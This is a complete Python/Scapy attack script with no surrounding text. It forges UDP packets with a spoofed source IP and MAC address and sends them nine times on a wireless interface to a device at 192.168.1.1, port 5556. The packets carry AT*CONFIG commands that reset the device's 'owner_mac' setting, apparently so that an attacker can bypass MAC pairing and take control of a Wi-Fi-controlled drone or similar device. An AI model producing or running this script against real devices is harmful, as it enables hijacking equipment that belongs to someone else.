from scapy.all import *
from time import sleep

srcIP = '192.168.1.2'
dstIP = '192.168.1.1'
srcPort = 5556
dstPort = 5556
srcMAC = '58:44:98:13:80:6c'
dstMAC = '90:03:b7:e8:55:72'

macfilteroff = "AT*CONFIG_IDS=1,\"6407da12\",\"6b8ae8b1\",\"96e3654b\"\rAT*CONFIG=2,\"network:owner_mac\",\"00:00:00:00:00:00\"\r" 

payload = macfilteroff
spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload

for i in range(1, 10):
	sendp(spoofed_packet, iface="wlan0")
	sleep(0.3);

